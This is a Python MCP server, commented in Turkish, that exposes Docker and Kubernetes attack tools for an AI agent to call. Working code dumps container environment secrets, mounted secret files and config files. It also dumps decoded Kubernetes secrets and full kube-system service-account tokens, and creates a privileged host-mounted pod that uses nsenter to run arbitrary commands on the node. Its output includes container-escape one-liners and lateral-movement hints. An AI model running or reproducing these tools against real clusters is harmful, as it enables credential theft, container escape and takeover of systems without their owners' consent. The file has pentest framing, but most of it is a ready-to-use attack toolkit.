#!/usr/bin/env python3
"""
mcp-container-tools: Docker ve Kubernetes Pentest Sunucusu
Container escape, K8s RBAC analizi, secret dump ve image tarama araçları.
"""

import os
import json
import shlex
import base64
import subprocess
import tempfile
from mcp.server.fastmcp import FastMCP

mcp = FastMCP(
    "mcp-container-tools",
    instructions="Docker/Kubernetes güvenlik testi — container escape, RBAC audit, secret dump"
)

CCO_HOME = os.environ.get("CCO_HOME", os.path.expanduser("~/.cco"))


def run_cmd(cmd: str, timeout: int = 60) -> dict:
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"stdout": proc.stdout, "stderr": proc.stderr, "exit_code": proc.returncode, "cmd": cmd}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": f"Timeout {timeout}s", "exit_code": 124, "cmd": cmd}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "exit_code": 1, "cmd": cmd}


def k8s_request(api_server: str, token: str, cacert: str, path: str) -> dict:
    """K8s API'ye GET isteği yap."""
    cacert_arg = f"--cacert {shlex.quote(cacert)}" if cacert and os.path.exists(cacert) else "-k"
    cmd = (
        "curl -s " + cacert_arg +
        " -H 'Authorization: Bearer " + token + "'" +
        " '" + api_server.rstrip("/") + path + "'"
    )
    res = run_cmd(cmd, timeout=15)
    if res["exit_code"] != 0:
        return {"error": res["stderr"]}
    try:
        return json.loads(res["stdout"])
    except json.JSONDecodeError:
        return {"raw": res["stdout"][:2000]}


# ────────────────────────────────────────────────────────────────
# DOCKER TOOLS
# ────────────────────────────────────────────────────────────────

@mcp.tool()
def docker_escape_check(container_id: str = "") -> str:
    """Container escape vektörlerini kontrol et.
    Privileged flag, Docker socket mount, tehlikeli capabilities.

    Args:
        container_id: Hedef container ID (boş: mevcut container)
    """
    findings = []

    # Mevcut container içindeyiz — /proc kontrolü
    checks = {
        "privileged": "cat /proc/self/status | grep CapEff",
        "docker_socket": "ls -la /var/run/docker.sock 2>/dev/null && echo SOCKET_EXISTS",
        "cgroup_v1": "cat /proc/self/cgroup | head -5",
        "capabilities": "capsh --print 2>/dev/null || cat /proc/self/status | grep Cap",
        "host_mounts": "cat /proc/self/mountinfo | grep -E 'host|/dev/sd|/dev/nvm' | head -10",
        "proc_access": "ls /proc/sysrq-trigger 2>/dev/null && echo SYSRQ_ACCESSIBLE",
        "kubernetes": "ls /var/run/secrets/kubernetes.io 2>/dev/null && echo K8S_TOKEN_EXISTS",
        "env_secrets": "env | grep -iE 'key|token|secret|password' | head -20",
    }

    results = {}
    for name, cmd in checks.items():
        res = run_cmd(cmd)
        results[name] = res["stdout"].strip()[:500]

    # Privileged analiz
    cap_eff = results.get("capabilities", "")
    if "0000003fffffffff" in cap_eff or "cap_sys_admin" in cap_eff.lower():
        findings.append("CRITICAL: Container is PRIVILEGED — host disk mount possible")

    if "SOCKET_EXISTS" in results.get("docker_socket", ""):
        findings.append("CRITICAL: Docker socket mounted — full Docker API access")

    if "K8S_TOKEN_EXISTS" in results.get("kubernetes", ""):
        findings.append("HIGH: Kubernetes service account token present")

    if not findings:
        findings.append("INFO: No obvious escape vectors found — check capabilities manually")

    # Dış container kontrolü (Docker CLI)
    if container_id:
        inspect_res = run_cmd(f"docker inspect {shlex.quote(container_id)} 2>/dev/null")
        if inspect_res["exit_code"] == 0:
            try:
                inspect = json.loads(inspect_res["stdout"])
                if inspect and inspect[0].get("HostConfig", {}).get("Privileged"):
                    findings.append("CRITICAL: docker inspect confirms Privileged=true")
            except json.JSONDecodeError:
                pass

    return json.dumps({
        "container_id": container_id or "current",
        "critical_findings": findings,
        "check_results": results,
        "exploit_hints": {
            "privileged": "mount /dev/sda1 /mnt && chroot /mnt /bin/bash",
            "socket": "docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host ubuntu chroot /host",
            "cgroup_v1": "Use cgroup v1 release_agent escape (needs SYS_ADMIN)"
        }
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def docker_enum_secrets(container_id: str = "") -> str:
    """Container'daki gizli bilgileri enumerate et.
    Env vars, mounted secrets, config dosyaları.

    Args:
        container_id: Hedef container ID (boş: mevcut container)
    """
    secret_locations = [
        "/run/secrets",
        "/var/run/secrets",
        "/etc/secrets",
        "/app/secrets",
        "/secrets",
    ]

    config_patterns = [
        "*.env", "*.conf", "config.yaml", "config.json",
        "application.properties", "settings.py", "database.yml",
        ".env", ".env.local", ".env.production"
    ]

    results = {}

    # Env vars
    env_res = run_cmd("env | sort")
    sensitive_env = [
        line for line in env_res["stdout"].splitlines()
        if any(k in line.upper() for k in ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASSWD", "AUTH", "CRED"])
    ]
    results["sensitive_env_vars"] = sensitive_env[:30]

    # Secret mount'ları
    mounted_secrets = []
    for loc in secret_locations:
        ls_res = run_cmd(f"find {loc} -type f 2>/dev/null | head -20")
        if ls_res["exit_code"] == 0 and ls_res["stdout"].strip():
            for fpath in ls_res["stdout"].strip().splitlines():
                cat_res = run_cmd(f"cat {shlex.quote(fpath)} 2>/dev/null")
                mounted_secrets.append({
                    "path": fpath,
                    "content": cat_res["stdout"][:500]
                })
    results["mounted_secrets"] = mounted_secrets

    # Uygulama config dosyaları
    config_files = []
    for pattern in config_patterns[:5]:
        find_res = run_cmd(f"find / -name '{pattern}' -not -path '*/proc/*' -not -path '*/sys/*' 2>/dev/null | head -5")
        if find_res["stdout"].strip():
            for fpath in find_res["stdout"].strip().splitlines():
                cat_res = run_cmd(f"cat {shlex.quote(fpath)} 2>/dev/null")
                content = cat_res["stdout"][:1000]
                if any(k.lower() in content.lower() for k in ["password", "token", "key", "secret"]):
                    config_files.append({"path": fpath, "content": content})
    results["sensitive_config_files"] = config_files[:5]

    return json.dumps(results, indent=2, ensure_ascii=False)


@mcp.tool()
def container_image_scan(image: str, severity: str = "HIGH,CRITICAL") -> str:
    """Trivy ile container image'ini CVE taramasından geçir.

    Args:
        image: Image adı (örn: nginx:latest, ubuntu:22.04)
        severity: Gösterilecek severity (HIGH,CRITICAL veya ALL)
    """
    trivy_check = run_cmd("which trivy 2>/dev/null")
    if trivy_check["exit_code"] != 0:
        # Trivy yok — Docker Scout veya grype dene
        grype_check = run_cmd("which grype 2>/dev/null")
        if grype_check["exit_code"] == 0:
            res = run_cmd(f"grype {shlex.quote(image)} --only-fixed 2>&1 | head -50", timeout=120)
            return json.dumps({"tool": "grype", "output": res["stdout"][:3000]}, indent=2)
        return json.dumps({
            "error": "Trivy veya grype bulunamadı. Kur: apt install trivy",
            "install": "curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin"
        })

    res = run_cmd(
        f"trivy image --severity {shlex.quote(severity)} --format json {shlex.quote(image)} 2>/dev/null",
        timeout=180
    )

    try:
        data = json.loads(res["stdout"])
        vuln_summary = []
        for result in data.get("Results", []):
            for vuln in result.get("Vulnerabilities", [])[:20]:
                vuln_summary.append({
                    "id": vuln.get("VulnerabilityID"),
                    "pkg": vuln.get("PkgName"),
                    "severity": vuln.get("Severity"),
                    "title": vuln.get("Title", "")[:100],
                    "fixed_version": vuln.get("FixedVersion", "N/A")
                })
        return json.dumps({
            "image": image,
            "total_vulns": len(vuln_summary),
            "vulnerabilities": vuln_summary,
        }, indent=2, ensure_ascii=False)
    except json.JSONDecodeError:
        return json.dumps({"image": image, "raw_output": res["stdout"][:3000]}, indent=2)


@mcp.tool()
def registry_enum(
    registry_url: str,
    username: str = "",
    password: str = ""
) -> str:
    """Docker Registry API'yi enumerate et — unauthenticated erişim kontrolü.

    Args:
        registry_url: Registry URL (örn: http://10.0.0.1:5000 veya https://registry.target.com)
        username: Kullanıcı adı (opsiyonel)
        password: Parola (opsiyonel)
    """
    base = registry_url.rstrip("/")
    auth_arg = f"-u {shlex.quote(username)}:{shlex.quote(password)}" if username else ""

    # Catalog endpoint
    catalog_res = run_cmd(f"curl -s {auth_arg} -k '{base}/v2/_catalog'", timeout=10)

    images = []
    try:
        data = json.loads(catalog_res["stdout"])
        images = data.get("repositories", [])
    except json.JSONDecodeError:
        pass

    tags = {}
    for img in images[:10]:
        tag_res = run_cmd(f"curl -s {auth_arg} -k '{base}/v2/{img}/tags/list'", timeout=10)
        try:
            tag_data = json.loads(tag_res["stdout"])
            tags[img] = tag_data.get("tags", [])
        except json.JSONDecodeError:
            tags[img] = []

    return json.dumps({
        "registry": base,
        "authenticated": bool(username),
        "images_found": len(images),
        "images": images,
        "tags": tags,
        "pull_cmd": f"docker pull {base}/IMAGE:TAG" if images else "No images found",
        "unauthenticated": not bool(username) and bool(images)
    }, indent=2, ensure_ascii=False)


# ────────────────────────────────────────────────────────────────
# KUBERNETES TOOLS
# ────────────────────────────────────────────────────────────────

def _get_k8s_defaults() -> tuple[str, str, str]:
    """K8s service account bilgilerini otomatik al."""
    sa_dir = "/var/run/secrets/kubernetes.io/serviceaccount"
    token = ""
    cacert = ""
    api_server = ""

    token_path = os.path.join(sa_dir, "token")
    if os.path.exists(token_path):
        with open(token_path) as f:
            token = f.read().strip()

    cacert_path = os.path.join(sa_dir, "ca.crt")
    if os.path.exists(cacert_path):
        cacert = cacert_path

    host = os.environ.get("KUBERNETES_SERVICE_HOST", "")
    port = os.environ.get("KUBERNETES_SERVICE_PORT_HTTPS", "443")
    if host:
        api_server = f"https://{host}:{port}"

    return api_server, token, cacert


@mcp.tool()
def k8s_rbac_audit(
    api_server: str = "",
    token: str = "",
    cacert: str = "",
    namespace: str = "default"
) -> str:
    """Kubernetes RBAC izinlerini listele — kubectl auth can-i --list eşdeğeri.

    Args:
        api_server: K8s API server URL (boş: pod içinden otomatik)
        token: Service account token (boş: pod içinden otomatik)
        cacert: CA sertifikası yolu (boş: pod içinden otomatik)
        namespace: Namespace (varsayılan: default)
    """
    if not api_server or not token:
        api_server, token, cacert = _get_k8s_defaults()

    if not api_server:
        return json.dumps({"error": "K8s API server bulunamadı — api_server parametresi girin"})

    # Self-subject access review ile izinleri kontrol et
    resources_to_check = [
        ("pods", "create"), ("pods", "exec"), ("pods", "list"),
        ("secrets", "get"), ("secrets", "list"),
        ("serviceaccounts", "create"), ("clusterrolebindings", "create"),
        ("nodes", "list"), ("namespaces", "list"),
    ]

    cacert_arg = f"--cacert {shlex.quote(cacert)}" if cacert and os.path.exists(cacert) else "-k"
    permissions = []

    for resource, verb in resources_to_check:
        sar_body = json.dumps({
            "apiVersion": "authorization.k8s.io/v1",
            "kind": "SelfSubjectAccessReview",
            "spec": {"resourceAttributes": {"namespace": namespace, "verb": verb, "resource": resource}}
        })
        cmd = (
            "curl -s " + cacert_arg +
            " -H 'Authorization: Bearer " + token + "'"
            " -H 'Content-Type: application/json'"
            " -X POST"
            " -d '" + sar_body.replace("'", "'\"'\"'") + "'"
            " '" + api_server + "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews'"
        )
        res = run_cmd(cmd, timeout=10)
        try:
            data = json.loads(res["stdout"])
            allowed = data.get("status", {}).get("allowed", False)
            permissions.append({
                "resource": resource,
                "verb": verb,
                "allowed": allowed
            })
        except json.JSONDecodeError:
            permissions.append({"resource": resource, "verb": verb, "allowed": "unknown"})

    allowed = [p for p in permissions if p["allowed"] is True]
    escalation_paths = []

    if any(p["resource"] == "pods" and p["verb"] == "create" for p in allowed):
        escalation_paths.append("CREATE PODS → k8s_pod_escape ile node escape mümkün")
    if any(p["resource"] == "secrets" and p["verb"] in ("get", "list") for p in allowed):
        escalation_paths.append("GET/LIST SECRETS → k8s_secret_dump ile credential harvest")
    if any(p["resource"] == "clusterrolebindings" and p["verb"] == "create" for p in allowed):
        escalation_paths.append("CREATE CLUSTERROLEBINDINGS → ClusterAdmin'e yükselebilirsin")

    return json.dumps({
        "namespace": namespace,
        "permissions": permissions,
        "allowed_count": len(allowed),
        "escalation_paths": escalation_paths
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def k8s_secret_dump(
    api_server: str = "",
    token: str = "",
    cacert: str = "",
    namespace: str = "default"
) -> str:
    """Kubernetes secret'larını topla ve base64 decode et.

    Args:
        api_server: K8s API server URL
        token: Service account token
        cacert: CA sertifikası yolu
        namespace: Namespace ('all' için tüm namespace'ler)
    """
    if not api_server or not token:
        api_server, token, cacert = _get_k8s_defaults()

    if not api_server:
        return json.dumps({"error": "K8s API server bulunamadı"})

    ns_path = "/api/v1/secrets" if namespace == "all" else f"/api/v1/namespaces/{namespace}/secrets"
    data = k8s_request(api_server, token, cacert, ns_path)

    if "error" in data:
        return json.dumps(data)

    secrets_decoded = []
    for item in data.get("items", [])[:30]:
        name = item.get("metadata", {}).get("name", "unknown")
        ns = item.get("metadata", {}).get("namespace", namespace)
        secret_type = item.get("type", "")
        decoded_data = {}

        for key, val in (item.get("data") or {}).items():
            try:
                decoded_data[key] = base64.b64decode(val).decode("utf-8", errors="replace")[:500]
            except Exception:
                decoded_data[key] = val

        secrets_decoded.append({
            "name": name,
            "namespace": ns,
            "type": secret_type,
            "data": decoded_data
        })

    return json.dumps({
        "namespace": namespace,
        "total_secrets": len(data.get("items", [])),
        "secrets": secrets_decoded
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def k8s_sa_token_abuse(
    api_server: str = "",
    token: str = "",
    cacert: str = "",
    target_namespace: str = "kube-system"
) -> str:
    """Belirtilen namespace'deki service account token'larını çek ve test et.
    kube-system SA token'ları genellikle yüksek yetkiye sahiptir.

    Args:
        api_server: K8s API server URL
        token: Mevcut service account token
        cacert: CA sertifikası yolu
        target_namespace: Hedef namespace (varsayılan: kube-system)
    """
    if not api_server or not token:
        api_server, token, cacert = _get_k8s_defaults()

    if not api_server:
        return json.dumps({"error": "K8s API server bulunamadı"})

    # SA listesi
    sa_data = k8s_request(api_server, token, cacert, f"/api/v1/namespaces/{target_namespace}/serviceaccounts")

    # Secret'lar (SA token'ları)
    secret_data = k8s_request(api_server, token, cacert, f"/api/v1/namespaces/{target_namespace}/secrets")

    sa_tokens = []
    for item in (secret_data.get("items") or []):
        if item.get("type") == "kubernetes.io/service-account-token":
            decoded = {}
            for k, v in (item.get("data") or {}).items():
                try:
                    decoded[k] = base64.b64decode(v).decode("utf-8", errors="replace")[:300]
                except Exception:
                    decoded[k] = v

            sa_name = item.get("metadata", {}).get("annotations", {}).get("kubernetes.io/service-account.name", "")
            sa_tokens.append({
                "secret_name": item.get("metadata", {}).get("name"),
                "sa_name": sa_name,
                "token_preview": decoded.get("token", "")[:100] + "...",
                "full_token": decoded.get("token", "")
            })

    return json.dumps({
        "namespace": target_namespace,
        "service_accounts": [sa.get("metadata", {}).get("name") for sa in (sa_data.get("items") or [])],
        "sa_tokens_found": len(sa_tokens),
        "tokens": sa_tokens[:10],
        "usage": "export TOKEN=FULL_TOKEN; curl -sk -H 'Authorization: Bearer $TOKEN' " + api_server + "/api/v1/nodes"
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def k8s_pod_escape(
    api_server: str = "",
    token: str = "",
    cacert: str = "",
    node_name: str = "",
    cmd: str = "id"
) -> str:
    """Privileged pod oluşturarak node escape gerçekleştir.
    create pods yetkisi gerektirir.

    Args:
        api_server: K8s API server URL
        token: Service account token
        cacert: CA sertifikası yolu
        node_name: Pod'un çalışacağı node (boş: herhangi bir node)
        cmd: Pod içinde çalıştırılacak komut
    """
    if not api_server or not token:
        api_server, token, cacert = _get_k8s_defaults()

    if not api_server:
        return json.dumps({"error": "K8s API server bulunamadı"})

    pod_name = "cco-escape-" + str(os.getpid())
    node_selector = {"kubernetes.io/hostname": node_name} if node_name else {}

    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": pod_name, "namespace": "default"},
        "spec": {
            "hostPID": True,
            "hostNetwork": True,
            "hostIPC": True,
            "nodeName": node_name if node_name else None,
            "containers": [{
                "name": "escape",
                "image": "ubuntu:22.04",
                "command": ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- " + cmd + " > /tmp/output 2>&1 && cat /tmp/output"],
                "securityContext": {"privileged": True},
                "volumeMounts": [{"mountPath": "/host", "name": "host-vol"}]
            }],
            "volumes": [{"name": "host-vol", "hostPath": {"path": "/"}}]
        }
    }

    # None değerlerini temizle
    if not node_name:
        del pod_manifest["spec"]["nodeName"]

    manifest_str = json.dumps(pod_manifest)
    cacert_arg = f"--cacert {shlex.quote(cacert)}" if cacert and os.path.exists(cacert) else "-k"

    create_cmd = (
        "curl -s " + cacert_arg +
        " -H 'Authorization: Bearer " + token + "'"
        " -H 'Content-Type: application/json'"
        " -X POST"
        " -d '" + manifest_str.replace("'", "'\"'\"'") + "'"
        " '" + api_server + "/api/v1/namespaces/default/pods'"
    )

    create_res = run_cmd(create_cmd, timeout=15)

    # Cleanup komutu
    delete_cmd = (
        "curl -s " + cacert_arg +
        " -H 'Authorization: Bearer " + token + "'"
        " -X DELETE"
        " '" + api_server + "/api/v1/namespaces/default/pods/" + pod_name + "'"
    )

    return json.dumps({
        "pod_name": pod_name,
        "command": cmd,
        "create_result": create_res["stdout"][:1000],
        "exit_code": create_res["exit_code"],
        "cleanup_cmd": delete_cmd,
        "note": "Pod oluştuktan sonra ~10s bekle, çıktı için kubectl logs " + pod_name + " --follow"
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def k8s_network_policy_audit(
    api_server: str = "",
    token: str = "",
    cacert: str = ""
) -> str:
    """Kubernetes network policy'lerini analiz et.
    Policy yoksa tüm pod-to-pod iletişim açık demektir.

    Args:
        api_server: K8s API server URL
        token: Service account token
        cacert: CA sertifikası yolu
    """
    if not api_server or not token:
        api_server, token, cacert = _get_k8s_defaults()

    if not api_server:
        return json.dumps({"error": "K8s API server bulunamadı"})

    # Network policies
    np_data = k8s_request(api_server, token, cacert, "/apis/networking.k8s.io/v1/networkpolicies")
    # Services
    svc_data = k8s_request(api_server, token, cacert, "/api/v1/services")
    # Namespaces
    ns_data = k8s_request(api_server, token, cacert, "/api/v1/namespaces")

    policies = []
    for item in (np_data.get("items") or []):
        policies.append({
            "name": item.get("metadata", {}).get("name"),
            "namespace": item.get("metadata", {}).get("namespace"),
            "pod_selector": item.get("spec", {}).get("podSelector", {}),
            "ingress": bool(item.get("spec", {}).get("ingress")),
            "egress": bool(item.get("spec", {}).get("egress")),
        })

    services = []
    for item in (svc_data.get("items") or [])[:20]:
        meta = item.get("metadata", {})
        spec = item.get("spec", {})
        services.append({
            "name": meta.get("name"),
            "namespace": meta.get("namespace"),
            "type": spec.get("type"),
            "cluster_ip": spec.get("clusterIP"),
            "ports": spec.get("ports", [])
        })

    namespaces = [ns.get("metadata", {}).get("name") for ns in (ns_data.get("items") or [])]

    return json.dumps({
        "namespaces": namespaces,
        "network_policies_count": len(policies),
        "network_policies": policies,
        "services_sample": services[:15],
        "risk": "HIGH: No network policies — all pods can communicate" if not policies else "Policies exist — review above",
        "lateral_movement": "curl http://SERVICE.NAMESPACE.svc.cluster.local:PORT (from any pod)"
    }, indent=2, ensure_ascii=False)


@mcp.tool()
def helm_chart_scan(chart_path: str) -> str:
    """Helm chart'ı güvenlik açıkları için tara.
    Hardcoded secret, privileged config, dangerous mount tespiti.

    Args:
        chart_path: Helm chart dizini
    """
    if not os.path.isdir(chart_path):
        return json.dumps({"error": f"Dizin bulunamadı: {chart_path}"})

    findings = []

    # Tehlikeli pattern'lar
    patterns = {
        "privileged": "privileged: true",
        "host_pid": "hostPID: true",
        "host_network": "hostNetwork: true",
        "host_ipc": "hostIPC: true",
        "allow_privesc": "allowPrivilegeEscalation: true",
        "run_as_root": "runAsUser: 0",
        "host_path": "hostPath:",
        "hardcoded_password": r"password:\s+\S+",
        "hardcoded_token": r"token:\s+[a-zA-Z0-9+/=]{20,}",
        "hardcoded_secret": r"secret:\s+\S+",
        "no_resource_limits": "resources: {}",
    }

    severity_map = {
        "privileged": "CRITICAL", "host_pid": "HIGH", "host_network": "MEDIUM",
        "host_ipc": "MEDIUM", "allow_privesc": "HIGH", "run_as_root": "HIGH",
        "host_path": "MEDIUM", "hardcoded_password": "CRITICAL",
        "hardcoded_token": "CRITICAL", "hardcoded_secret": "HIGH",
        "no_resource_limits": "LOW"
    }

    for root, _, files in os.walk(chart_path):
        for fname in files:
            if not fname.endswith((".yaml", ".yml", ".json")):
                continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath) as f:
                    content = f.read()
                rel_path = os.path.relpath(fpath, chart_path)

                for check_name, pattern in patterns.items():
                    grep_res = run_cmd(f"grep -nE {shlex.quote(pattern)} {shlex.quote(fpath)} 2>/dev/null")
                    if grep_res["exit_code"] == 0 and grep_res["stdout"].strip():
                        for line in grep_res["stdout"].strip().splitlines():
                            findings.append({
                                "file": rel_path,
                                "check": check_name,
                                "severity": severity_map.get(check_name, "MEDIUM"),
                                "detail": line.strip()[:200]
                            })
            except Exception:
                continue

    critical = [f for f in findings if f["severity"] == "CRITICAL"]
    high = [f for f in findings if f["severity"] == "HIGH"]

    return json.dumps({
        "chart_path": chart_path,
        "total_findings": len(findings),
        "critical_count": len(critical),
        "high_count": len(high),
        "findings": findings
    }, indent=2, ensure_ascii=False)


# ────────────────────────────────────────────────────────────────
# SERVER BAŞLAT
# ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    mcp.run(transport="stdio")
